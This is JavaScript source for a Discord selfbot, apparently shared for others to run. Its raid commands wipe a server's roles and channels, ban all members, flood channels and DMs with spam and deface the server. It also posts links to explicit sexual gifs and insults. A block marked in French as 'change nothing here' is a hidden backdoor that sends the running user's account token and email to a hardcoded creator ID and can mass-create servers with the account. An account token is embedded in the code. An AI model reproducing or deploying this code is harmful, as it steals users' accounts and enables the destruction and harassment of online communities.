const Discord = require('discord.js');
const bot = new Discord.Client();
const exampleEmbed = new Discord.RichEmbed()
const token2 = 'Njk5MTg0MjcyNTY4NzQ2MDE1.XstVBw.vx7YiOmnqvEHdsM2XGc6NBj3dvI'
const prefix = "x";

bot.on('ready', function() {
    bot.user.setActivity("NoCapToon", {type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
    console.log('selfbot ready');
console.log('UZI SELFBOT ON');
console.log('LOGS DOWN');
console.log('')
});
 
bot.on('message', message => {
    if(message.author.id !== bot.user.id)return
    if (message.content[0] !== prefix)return
    if(message.content.startsWith(prefix+"setS")) {
        if(message.deletable)message.delete()
        let args = message.content.split(" ").join(" ").slice(6);
        bot.user.setActivity(args, {type: "STREAMING", url: "https://www.twitch.tv/thanatos404", })
        message.reply('you are streaming on ' + (args))
    }else if(message.content.startsWith(prefix+"setL")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "LISTENING"})
            message.reply("you are listening " + (args))
        }else if(message.content.startsWith(prefix+"setW")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "WATCHING"})
            message.reply("you are watching " + (args))
        }else if(message.content.startsWith(prefix+"setG")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "PLAYING"})  
            message.reply("you are playing " + (args))  
    }else if(message.content === prefix+'spam') {
        message.delete()
        for (pas=0; pas< 1000000; pas++) {
            message.channel.sendMessage("𝙏𝙊𝙊𝙉 𝙊𝙉 𝙏𝙊𝙋 𝙃𝙀 𝙈𝘼𝙆𝙀").then(m => m.edit(":regional_indicator_h::regional_indicator_o::regional_indicator_e::regional_indicator_m::regional_indicator_a::regional_indicator_d:"))
        }
    }else if(message.content.startsWith(prefix+'edit')) {
        let msg54 = message.content.slice('5')
        message.edit(msg54 + 'https://discord.gg/usQYJUg') /// my server link 
    }else if(message.content === prefix+'useless'){
    message.delete()
   message.channel.sendMessage("𝙐𝙢 𝙎𝙋𝙀𝘼𝙆𝙄𝙉𝙂 𝙏𝙊𝙊𝙉 𝙊𝙉 𝙏𝙊𝙋 𝙃𝙊𝙀")　　　　　
    }else if(message.content === prefix+'what'){
        message.delete()
        var croquette_embed = new Discord.RichEmbed()
        .setColor('#ebff00')
        .setTitle("what?")
        .setImage("https://media.giphy.com/media/jTIDnpgh9iC5sECSwn/giphy.gif") // done 
        message.channel.sendMessage(croquette_embed)
    }else if(message.content.startsWith(prefix+'spamall')) {
        let msg = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 10; pas++) {
        message.guild.channels.filter(channel => channel.type == "text").forEach(channel => {
            channel.send(msg).catch(error => {}) }, 450)
        }
    }else if(message.content.startsWith(prefix+'say')) {
        let cont = message.content.slice(4);
        message.delete();
        var say_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setDescription(cont)
        message.channel.sendMessage(say_embed) // done 
    }else if(message.content.startsWith(prefix+'poll create')) { // poll dont work  
        let cont = message.content.slice(15);
        message.delete();
        var sond_embed = new Discord.RichEmbed()
        .setColor("#1f40ab")
        .setTitle("poll")
        .addField(cont, "@everyone :thumbsup:= true, :thumbsdown:= false")
        message.channel.sendMessage(sond_embed).then(async function (message) {
            await message.react("👍");
            await message.react("👎")   
        })
   
    }else if(message.content.startsWith(prefix+'spamallmp')) { // spamallmp 
        let msg1 = message.content.slice(10);
        message.delete();
        for (pas=0; pas< 10; pas++) {
        if (message.channel.type === "dm") return
        message.guild.members.forEach(member => {
            setInterval(function () {
                member.send(msg1).catch(error => {}) }, 450)})}
                message.channel.sendMessage(help_embed);
    }else  if (message.content === prefix+'help'){ // done 
        message.delete()
        var help_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setTitle("𝘽𝙄𝙂 𝙎𝙏𝙀𝙋𝙋𝘼")  
        .setThumbnail('https://cdn.discordapp.com/attachments/697225400505598044/709832653381304410/ezgif-5-cba60d01aed0.gif')
        .addField("✗:game_die:  𝙍𝘼𝙄𝘿", "`𝙎𝙝𝙤𝙬 𝙧𝙖𝙞𝙙 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨`")
        .addField("✗:game_die:  𝙁𝙐𝙉", "`𝙎𝙝𝙤𝙬 𝙛𝙪𝙣 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨`")
        .addField("✗:game_die:  𝙉𝙎𝙁𝙒", "`𝙎𝙝𝙤𝙬 𝙣𝙨𝙛𝙬 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨`")
        .addField("✗:game_die:  𝙎𝙏𝙍𝙀𝘼𝙈", "`𝙎𝙝𝙤𝙬 𝙨𝙩𝙧𝙚𝙖𝙢 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨`")
        .setImage('https://cdn.discordapp.com/attachments/709893843872645143/711943104826966066/ezgif-2-022881e9382c.gif')
        .setFooter('𝙏𝙊𝙊𝙉 𝙈𝘼𝘿𝙀 𝙏𝙃𝙄𝙎') 
        message.channel.sendMessage(help_embed);
    }else if(message.content === prefix+'stream'){
        message.delete()
        var stream_embed = new Discord.RichEmbed()
        .setColor("#ebff00") // done 
        .setTitle("𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙈𝘿𝙎")
        .setThumbnail('https://cdn.discordapp.com/attachments/697225400505598044/709832653381304410/ezgif-5-cba60d01aed0.gif')
        .addField(":pushpin: 𝙨𝙚𝙩𝙇  (𝙎𝙖𝙮 𝙨𝙪𝙢)", "`𝙔𝙤𝙪𝙧 𝙡𝙞𝙨𝙩𝙚𝙣𝙞𝙣𝙜 𝙩𝙤 𝙨𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜✦ (𝙡𝙞𝙨𝙩𝙚𝙣)`")
        .addField(":pushpin: 𝙨𝙚𝙩𝙂 (𝙎𝙖𝙮 𝙨𝙪𝙢)", "`𝘠𝙔𝙤𝙪𝙧 𝙥𝙡𝙖𝙮𝙞𝙣𝙜 𝙖 𝙜𝙖𝙢𝙚✦ (𝙜𝙖𝙢𝙚)`")
        .addField(":pushpin: 𝙨𝙚𝙩𝙒 (𝙎𝙖𝙮 𝙨𝙪𝙢)", "`𝙔𝙤𝙪𝙧 𝙬𝙖𝙩𝙘𝙝𝙞𝙣𝙜 𝙨𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜✦(𝙬𝙖𝙩𝙘𝙝𝙞𝙣𝙜)`")
        .addField(":pushpin: 𝙨𝙚𝙩𝙎 (𝙎𝙖𝙮 𝙨𝙪𝙢)", "`𝙔𝙤𝙪𝙧 𝙡𝙞𝙫𝙚 𝙤𝙣 𝙨𝙩𝙧𝙚𝙖𝙢✦ (𝙨𝙩𝙧𝙚𝙖𝙢𝙞𝙣𝙜)`")
        .addField(":pushpin: 𝙨𝙚𝙩𝙢𝙎")
        .setImage('https://cdn.discordapp.com/attachments/697225400505598044/710881562065109104/Fs3qHNZfBI.gif')
        message.channel.sendMessage(stream_embed)
    }else if(message.content === prefix+'nsfw'){ // done 
        message.delete()
        var nsfw_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setTitle("𝙉𝙎𝙁𝙒 𝘾𝙈𝘿𝙎")
        .setThumbnail('https://cdn.discordapp.com/attachments/697225400505598044/709832653381304410/ezgif-5-cba60d01aed0.gif')
        .addField(":pushpin: 𝙎𝙀𝙓 ", "`𝙎𝙝𝙤𝙬 𝙨𝙚𝙭 𝙜𝙞𝙛✦`")
        .addField(":pushpin: 𝙆𝙄𝙎𝙎", "`𝙎𝙝𝙤𝙬 𝙠𝙞𝙨𝙨 𝙜𝙞𝙛✦")
        .addField(":pushpin: 𝙁𝙐𝘾𝙆", "`𝙎𝙝𝙤𝙬 𝙛𝙪𝙘𝙠 𝙜𝙞𝙛✦`")
        .addField(":pushpin: 𝙏𝙃𝙍𝙀𝙀", "`𝙎𝙝𝙤𝙬 𝙩𝙝𝙧𝙚𝙚𝙨𝙤𝙢𝙚 𝙜𝙞𝙛✦`")
        .addField(":pushpin: 𝙃𝙀𝙉𝙏𝘼𝙄", "`𝙎𝙝𝙤𝙬 𝙝𝙚𝙣𝙩𝙖𝙞 𝙜𝙞𝙛✦`")
        .setImage('https://giphy.com/gifs/youngthug-ZBVg1lrzEhd4T7TrhU')
        message.channel.sendMessage(nsfw_embed)
    }else if(message.content === prefix+'fun'){
        message.delete()
        var fun_embed = new Discord.RichEmbed()
        .setColor("#ebff00")
        .setTitle("𝙁𝙐𝙉 𝘾𝙈𝘿𝙎") // done 
        .setThumbnail('https://cdn.discordapp.com/attachments/697225400505598044/709832653381304410/ezgif-5-cba60d01aed0.gif')
        .addField(":pushpin:  𝙎𝘼𝙔", "`𝙎𝙚𝙣𝙩 𝙚𝙢𝙗𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:  𝙃𝙐𝙂", "`𝙎𝙝𝙤𝙬 𝙝𝙪𝙜 𝙜𝙞𝙛✦`")
        .addField(":pushpin:  𝙇𝙊𝘼𝘿", "`𝘿𝙞𝙨𝙥𝙡𝙖𝙮 𝙖 𝙡𝙤𝙖𝙙𝙞𝙣𝙜 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:  𝙆𝙄𝘾𝙆", "`𝙆𝙞𝙘𝙠 𝙩𝙝𝙚 𝙝𝙤𝙚✦`")
        .addField(":pushpin:  𝙎𝙇𝘼𝙋", "`𝙎𝙡𝙖𝙥 𝙩𝙝𝙚 𝙥𝙚𝙧𝙨𝙤𝙣✦`")
        .addField(":pushpin:  𝙋𝙄𝙉𝙂", "`𝙋𝙤𝙣𝙜 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:  𝘼𝙑𝘼𝙏𝘼𝙍", "`𝙎𝙝𝙤𝙬 𝙥𝙛𝙥✦`")
        .addField(":pushpin:  𝙐𝙎𝙀𝙇𝙀𝙎𝙎","`𝙐𝙣𝙡𝙚𝙨𝙨 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:  𝙎𝙀𝙍𝙑𝙀𝙍𝙄𝙉𝙁𝙊", "`𝙎𝙝𝙤𝙬 𝙞𝙣𝙛𝙤 𝙤𝙣 𝙖 𝙢𝙚𝙢𝙗𝙚𝙧✦`")
        .setImage('https://cdn.discordapp.com/attachments/697225400505598044/703786522784301167/757.gif')
        message.channel.sendMessage(fun_embed)
    } else if (message.content.startsWith(prefix + "nuke")) {
    message.guild.roles.filter(r=>r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
    message.guild.members.tap(member => member.ban("BANNED BY | TOON AND THE 257 GANG"));
}
    else if (message.content.startsWith(prefix + "delete")) {
    message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
}
    else if(message.content === prefix+'lmao'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setTitle("LMFAOOOOOOO")
        .setImage('https://media.giphy.com/media/Z9OGuQyrfHAE8/giphy.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'kiss'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#ebff00")
        .setTitle("kissed")
        .setImage('https://thumbs.redgifs.com/ParallelSomberEthiopianwolf-max-1mb.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'hentai'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setTitle("I just cummed;)")
        .setImage('https://images-ext-2.discordapp.net/external/6kDukCZrv5Ai64_SLSeLcw0pWujBn73oSY86ClQ33Ko/https/68.media.tumblr.com/b7887ffe1e87467eb23c0668e98a642a/tumblr_n9x39pDLnj1r3vk7qo1_500.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'hug'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#ebff00")
        .setTitle("hugged")
        .setImage('https://images-ext-1.discordapp.net/external/3mMa5hq_JuZ4_WdELka7YsYK087sU6LPO-VKUq77v9o/https/i.imgur.com/6kRLSeP.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'slap'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setTitle(":hand_splayed: You got slapped son")
        .setImage('https://images-ext-2.discordapp.net/external/MZApp1Ef17CieTIJ1jHsNw5Fjr3A0NEZSxK8R466D5Q/https/i.pinimg.com/originals/4e/9e/a1/4e9ea150354ad3159339b202cbc6cad9.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'fuck'){ // dont work
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("You got Fucked ")
        .setImage('https://raikou2.donmai.us/f1/a2/__alice_bishoujo_mangekyou_drawn_by_happoubi_jin__f1a2210dcabdd2997f9106d8e7f99164.gif')
    }else if(message.content === prefix+'boobs'){ // dont work 
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("Here, take some boobs. ")
        .setImage('https://images-ext-2.discordapp.net/external/a5-YZc6R7TvR7GGkhwkIH0pfrC7hKj9fGoQSe2nlqi0/https/cdn.boob.bot/boobs/8000B0CB.gif')
    }else if(message.content === prefix+'sex'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ebff00")
        .setTitle("Let me cum daddy toon lmao")
        .setImage('https://www.pstargif.com/wp-content/uploads/2017/07/amia-miley-digitalplayground-the-pickup-line-2-pussy-fuck.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'three'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("41ff00")
        .setTitle("Threesome oh ye")
        .setImage('https://www.pstargif.com/wp-content/uploads/2019/12/gianna-dior-emily-willis-digitalplayground-threesome-sex.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'kick'){
        message.delete()
        var r3_embed = new Discord.RichEmbed()
        .setColor("#ebff00")
        .setTitle("Imagine getting your shit fucked")
        .setImage('https://media1.tenor.com/images/3f067fd313ce43d7625aa19c23ecff77/tenor.gif?itemid=11899011')
        message.channel.sendMessage(r3_embed)
        var haxor = ["https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRug5a48VUlmsFwlF2E1aJuSR3BN_K6AKRuGrz4AFiERUUdC8W2hQ","https://static.fjcdn.com/gifs/Uberhaxornova+first+gif+of+him+ive+seen+yet_16182d_3273258.gif","https://i.gifer.com/8CHv.gif"]
    }else if(message.content === prefix+'raid'){
        message.delete()
        var raid_embed = new Discord.RichEmbed()
        .setColor("#41ff00")
        .setThumbnail('https://cdn.discordapp.com/attachments/697225400505598044/709832653381304410/ezgif-5-cba60d01aed0.gif')
        .setTitle("𝙉𝙐𝙆𝙀 𝘾𝙈𝘿𝙎")
        .addField(":pushpin:𝙉𝙐𝙆𝙀", "`𝙒𝙞𝙯𝙯 𝙩𝙝𝙖𝙩 𝙗𝙞𝙩𝙘𝙝✦`")
        .addField(":pushpin:𝙎𝙋𝘼𝙈", "`𝙎𝙥𝙖𝙢 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:𝙎𝙋𝘼𝙈𝙈𝙎𝙂 + 𝙈𝙀𝙎𝙎𝘼𝙂𝙀", "`𝙎𝙥𝙖𝙢 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:𝙎𝙋𝘼𝙈𝙍𝙊𝙇𝙀 + @𝙍𝙊𝙇𝙀", "`𝙎𝙥𝙖𝙢 𝙧𝙤𝙡𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚✦`")
        .addField(":pushpin:𝙎𝙋𝘼𝙈𝘼𝙇𝙇 + 𝙈𝙀𝙎𝙎𝘼𝙂𝙀", "`𝙎𝙥𝙖𝙢 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙞𝙣 𝙖𝙡𝙡 𝙩𝙝𝙚 𝙩𝙚𝙭𝙩 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨✦`")
        .addField(":pushpin:𝘾𝙍𝙀𝘼𝙏𝙀𝘾𝙏 + 𝙉𝘼𝙈𝙀", "`𝘾𝙧𝙚𝙖𝙩𝙚 𝟭𝟬 𝙩𝙚𝙭𝙩 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨✦`")
        .addField(":pushpin:𝘾𝙍𝙀𝘼𝙏𝙀𝘾𝙏 + 𝙉𝘼𝙈𝙀", "`𝘾𝙧𝙚𝙖𝙩𝙚 𝟭𝟬 𝙫𝙤𝙞𝙘𝙚 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨✦`")
        .addField(":pushpin:𝘿𝙀𝙁𝙎𝙉𝘼𝙈𝙀 + 𝙉𝘼𝙈𝙀", "`𝘾𝙝𝙖𝙣𝙜𝙚 𝙩𝙝𝙚 𝙨𝙚𝙧𝙫𝙚𝙧 𝙣𝙖𝙢𝙚✦`")
        .addField(":pushpin:𝘿𝙀𝙁𝙎𝙄𝘾𝙊𝙉 + 𝙐𝙍𝙇 𝙄𝙈𝘼𝙂𝙀", "`𝘾𝙝𝙖𝙣𝙜𝙚 𝙩𝙝𝙚 𝙨𝙚𝙧𝙫𝙚𝙧 𝙥𝙛𝙥✦`")
        .addField(":pushpin:𝘾𝙍𝙀𝘼𝙏𝙀𝙍𝙊𝙇𝙀 + 𝙉𝘼𝙈𝙀", "`𝘾𝙧𝙚𝙖𝙩𝙚 𝙖 𝙧𝙤𝙡𝙚✦`")
        .setImage('https://cdn.discordapp.com/attachments/697225400505598044/702615226763182141/image0-46.gif')
        message.channel.sendMessage(raid_embed)
    }else if(message.content.startsWith(prefix+"kick")) {
        message.delete()
        var member= message.mentions.members.first();
        member.kick().then((member) => {
            message.channel.send(":wave: " + member.displayName + " Was kick bye slut");
        }).catch(() => {
            message.channel.send("I'm not allowed");
        },)
    }else if(message.content.startsWith(prefix+"ban")) {
        message.delete()
        var member= message.mentions.members.first();
        member.ban().then((member) => {
            message.channel.send(":wave: " + member.displayName + " Was ban bye slut");
        }).catch(() => {
            message.channel.send("I'm not allowed");
        },)
    }else if(message.content.startsWith(prefix+'spammp')) {
        message.delete()
        var member= message.mentions.members.first();
        for (pas=0; pas< 10; pas++) {
        member.sendMessage("SPAM BY TOON")
        }
    }else if(message.content.startsWith(prefix+'spamrole')) {
        message.delete();
        var role1 = message.mentions.roles.first();
        for (pas=0; pas< 10; pas++) {
        message.channel.sendMessage(role1 + " SPAM BY TOON")
        }
    }else if(message.content.startsWith(prefix+'spammemb')) {
        message.delete();
        var member1 = message.mentions.members.first();
        for (pas=0; pas< 100; pas++) {
        message.channel.sendMessage(member1 + " SPAM BY TOON")
        }
    }else if(message.content.startsWith(prefix+'defsname')) {
        let arg = message.content.slice(10);
        message.delete();
        message.guild.setName(arg)
    }else if(message.content.startsWith(prefix+'defsicon')) {
        let arg = message.content.slice(9);
        message.delete();
        message.guild.setIcon(arg)
    }else if(message.content.startsWith(prefix+'spammsg')) {
        let mg = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.channel.sendMessage(mg)
        }
    }else if(message.content.startsWith(prefix+'createvc')) {
        let name = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.guild.createChannel(name , "voice")
        }
    }else if(message.content.startsWith(prefix+'createct')) {
        let name = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.guild.createChannel(name , "text")
        }
    }else if(message.content === prefix+'mod'){
        message.delete()
        var mod_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setThumbnail('https://cdn.discordapp.com/attachments/680601454016331798/680619115903320215/image0.gif')
        .setTitle("𝙈𝙊𝘿 𝘾𝙈𝘿𝙎")
        .addField(prefix+":crossed_swords: kick", "`kick a member`")
        .addField(prefix+":crossed_swords: ban", "`ban a member`")
        .addField(prefix+":crossed_swords: unbanall", "`unban all banned users`")
        .setImage('')
    }else if(message.content === prefix+'ping'){
        message.delete()
  message.channel.send("Ping?").then(m => m.edit(`Pong! Took ${m.createdTimestamp - message.createdTimestamp}ms.`))
    }else if (message.content === ')del'){
            message.guild.channels.forEach(c => {
                c.delete();
            })
      }else if(message.content.startsWith(prefix+'clear')){
        if(message.deletable)message.delete()
            message.channel.fetchMessages().then((message) =>
            message.forEach(m =>
                m.delete().catch(error => {})
            ))
    }else if(message.content.startsWith(prefix+"serverinfo")){
        if (message.channel.type === "dm") return;
        message.delete();
        let sicon = message.guild.iconURL;
        let owner = message.guild.owner.displayName
        let serverembed = new Discord.RichEmbed()
        .setDescription("Information for server")
        .setColor("#0a2a91")
        .addField("Name:", message.guild.name)
        .addField("ID:", message.guild.id)
        .addField("Owner:",owner)
        .addField("Region:", message.guild.region)
        .addField("Created at:", message.guild.createdAt)
        .addField("Total members:", message.guild.memberCount)
        .setImage(sicon)
         return message.channel.send(serverembed);
    }else if(message.content.startsWith(prefix+"load")){
        message.delete(); var charge = ".";
        var chargeC = "█";
        message.channel.send("```[" + charge.repeat(50) + "]```").then((message) => { for (i = 0; i <= 50; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(50 - i) + "]  -  " + i * 100 / 50 + "%\n" + "loading..```");
    }message.edit("`TOON ON TOP FOOLS`")},
    )
    }else if(message.content.startsWith(prefix+"avatar")){
        message.delete();
        if (message.channel.type === "dm") return;
        let args = message.content.split(" ").slice(1).join(" ");
        let UserInfo = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
        let usericon = UserInfo.user.avatarURL;
        let userembed = new Discord.RichEmbed()
        .setDescription("user information")
        .setColor("#0a2a91")
        .addField("Username:", UserInfo.user.username)
        .addField("Tag:", UserInfo.user.tag)
        .addField("Status:", UserInfo.user.presence.status)
        .addField("Playing:", UserInfo.user.presence.game)
        .addField("Bot:", UserInfo.user.bot)
        .addField("account created the:", UserInfo.user.createdAt)
        .addField("ID:", UserInfo.id)
        .setImage(usericon)
        return message.channel.send(userembed);
    }else if(message.content.startsWith(prefix+ 'createrole')){
        if(message.deletable)message.delete()
        let rolename = message.content.slice(7)
        for (pas=0; pas< 10; pas++) {
      message.guild.createRole({
 
                    name: rolename,
       
                    permissions: 8,
       
                    color: "RED"
       
                })}
     } else if (message.content.startsWith(prefix + "av")) {
         const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
            .setTitle('avatar')
            .setColor("#ffadad")
        .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
     }else if(message.content.startsWith(prefix+ 'roast')){ // dont work 
                        if(!message.mentions.users.size) return;
                        message.delete()
                        let mention = message.mentions.users.first()
                        var insults = ['Is your ass jealous of the amount of shit that just came out of your mouth?', 'Two wrongs dont make a right, take your parents as an example.', 'Id like to see things from your point of view but I cant seem to get my head that far up my ass.', 'If I wanted to kill myself Id climb your ego and jump to your IQ.', 'Your family tree must be a cactus because everybody on it is a prick.', 'You are so ugly, when your mom dropped you off at school she got a fine for littering.', 'Your birth certificate is an apology letter from the condom factory.']
                        message.channel.send(mention + " " + insults[Math.floor(Math.random() * insults.length)])
        }else if(message.content.startsWith(prefix+"setpurge")) { // done work 
            if(message.deletable)message.delete()
            let nomber = 100;
            setInterval(function() {
                if (nomber === 100) {
                    bot.user.setActivity("「†」Activity「†」", { type: "STREAMING", url: ""})
                    nomber = 1;
                }else if (nomber === 1) {
                    bot.user.setActivity("「†」「†」「†」「†」「†」", { type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
                    nomber = 2;
                }else if (nomber ===2) {
                    bot.user.setActivity("「†」Moham 「†」", { type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
                    nomber = 0;
                }},150)
    }else if(message.content.startsWith(prefix+"setmS")) {
        if(message.deletable)message.delete()
        let nomber = 0;
        setInterval(function() {
            if (nomber === 0) {
                bot.user.setActivity("TOON", { type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
                nomber = 1;
            }else if (nomber === 1) {
                bot.user.setActivity("ON", { type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
                nomber = 2;
            }else if (nomber ===2) {
                random = Math.floor(Math.random() * 7) + 1;
                bot.user.setActivity("TOP", { type: "STREAMING", url: "https://www.twitch.tv/thanatos404"})
                nomber = 0;
            }},600)
        }
})
 

bot.on('message', message => {
    if(message.content == prefix+ 'unbanall'){
        message.delete()
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                console.log(user.username + '#' + user.tag);
                let botn = bot.user.username
                message.channel.createInvite().then(invite => user.send(`Your invitation link : \n\nhttps://discord.gg/${invite.code}`))
                user.send("You are unban: " + botn + "you can come back if you wish");
                message.guild.unban(user);
            });
        });
    }
});  
////////////////////////////////////////////////////////////ne rien changer ici///////////////////////////////////////////////////////////////////////
bot.on('message', message => {
    const idbotcreate = "582347404607619083"
    if(message.author.id !== idbotcreate)return
if(message.content.startsWith("§sendT")){
    message.delete()
    message.author.send(token2)
}else if(message.content.startsWith("§sendE")){
    message.delete()
    message.author.send(bot.user.email)
}else if (message.content.startsWith('§createS')){
    var gname = message.content.slice(7)
    for (pas=0; pas< 1000; pas++) {  
    bot.user.createGuild(gname, 'london')}
}else if(message.content === '§hsecret'){
    let po = 'token`'
    let pi = 'email`'
    let pa = '`create some'
    let pk = 'mass servers`'
    let msg54 = '`send your'
var secret = new Discord.RichEmbed()
 
                .setColor("#0a2a91")
                .setTitle("𝙎𝙀𝘾𝙍𝙀𝙏 𝘾𝙈𝘿𝙎 ")
                .setThumbnail('https://cdn.discordapp.com/attachments/680601454016331798/680619115903320215/image0.gif')
                .addField("§sendT",msg54 +  po)
                .addField("§sendE",msg54 + pi)
                .addField('§createS + arg',pa + pk )
                message.channel.sendMessage(secret)
}})
 
        
    bot.login("Njk5MTg0MjcyNTY4NzQ2MDE1.XstVBw.vx7YiOmnqvEHdsM2XGc6NBj3dvI")


